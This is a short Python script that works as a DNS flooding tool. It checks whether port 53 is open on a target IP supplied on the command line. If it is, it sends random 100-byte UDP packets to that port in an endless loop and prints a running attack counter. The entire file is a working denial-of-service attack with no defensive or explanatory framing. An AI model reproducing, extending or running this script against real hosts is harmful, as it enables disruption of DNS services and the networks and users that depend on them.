import socket,argparse,sys,itertools as it,random

class DNS_Attack:
    def __init__(self,target_ip):
        self.target_ip = target_ip
        self.dns_port = 53
        self.cycle = it.cycle(r"/-\|")
    def port_scan_dns(self):
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM)as sock:
            if sock.connect_ex((self.target_ip,self.dns_port)) == 0:
                return True

    def attack_dns(self,send_data=random._urandom(100),point=0):
        while True:
            point += 1
            with socket.socket(socket.AF_INET,socket.SOCK_DGRAM)as sock:
                sock.connect((self.target_ip,self.dns_port))
                sock.send(send_data)

                sys.stdout.write("\r")
                sys.stdout.write(f"[$] Attack : {self.target_ip} / [{point}] ~ {next(self.cycle)}" )
                sys.stdout.flush()
def main():
        try:
            arg = argparse.ArgumentParser()

            arg.add_argument("-ip",type=str,help="[$] Target_IP / -ip < target_ip >")
            parse = arg.parse_args()

            dns_attack = DNS_Attack(parse.ip)
            if dns_attack.port_scan_dns() == True:
                dns_attack.attack_dns()
            else:
                sys.stdout.write("\n[!] Not_Open_Port < 53 / domain >\n")
                sys.exit()

        except TypeError:
            sys.stdout.write(f"\n[#] Help_Command / ~% python {sys.argv[0]} -h\n")
            sys.exit()
        except KeyboardInterrupt:
            sys.stdout.write("\n[*] Stop_Process\n")
            sys.exit()


if __name__ == "__main__":
    main()

